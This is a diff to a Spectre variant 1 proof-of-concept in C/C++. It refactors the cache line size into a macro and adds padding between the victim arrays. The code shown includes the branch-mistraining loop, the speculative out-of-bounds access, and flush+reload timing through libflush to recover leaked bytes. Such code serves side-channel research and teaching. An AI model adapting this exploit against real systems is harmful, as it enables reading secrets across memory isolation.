@@ -5,15 +5,25 @@
 #include <stdint.h>
 #include <algorithm>
 
-#define ALIGN_CACHE __attribute__ ((aligned (512)))
+#define CACHE_LINE_SIZE 512
+#define ALIGN_CACHE __attribute__ ((aligned (CACHE_LINE_SIZE)))
+
+#define CONCAT_(x,y) x##y
+#define CONCAT(x,y) CONCAT_(x,y)
+#define PAD uint8_t ALIGN_CACHE CONCAT(pad_, __LINE__);
+
 
 /********************************************************************
 Victim code.
 ********************************************************************/
-uint8_t    ALIGN_CACHE array1[512];
+
+PAD
+uint8_t    ALIGN_CACHE array2[256 * CACHE_LINE_SIZE];
+PAD
+uint8_t    ALIGN_CACHE array1[CACHE_LINE_SIZE];
+PAD
 uint32_t   ALIGN_CACHE array1_size = sizeof(array1);
-uint8_t    ALIGN_CACHE array2[256 * 512];
-uint8_t    ALIGN_CACHE padding[1024];
+PAD
 
 /********************************************************************
 Analysis code
@@ -67,7 +77,7 @@ void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr
 
     /* Flush array2[256*(0..255)] from cache */
     for (i = 0; i < 256; i++)
-      libflush_flush(libflush_session, & array2[i * 512]); /* intrinsic for clflush instruction */
+      libflush_flush(libflush_session, & array2[i * CACHE_LINE_SIZE]); /* intrinsic for clflush instruction */
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
     training_x = tries % array1_size;
@@ -83,14 +93,14 @@ void readMemoryByte(libflush_session_t* libflush_session, const void* target_ptr
 
       /* Call the victim! */
       if (x < array1_size) {
-        array2[array1[x] * 512] = 0;
+        array2[array1[x] * CACHE_LINE_SIZE] = 0;
       }
     }
 
     /* Time reads. Order is lightly mixed up to prevent stride prediction */
     for (i = 0; i < 256; i++) {
       mix_i = ((i * 167) + 13) & 255;
-      addr = & array2[mix_i * 512];
+      addr = & array2[mix_i * CACHE_LINE_SIZE];
       uint64_t access_time = libflush_reload_address(libflush_session, (void*)addr);
       if (access_time <= cache_hit_threshold && mix_i != array1[tries % array1_size])
           results[mix_i]++; /* cache hit - add +1 to score for this value */
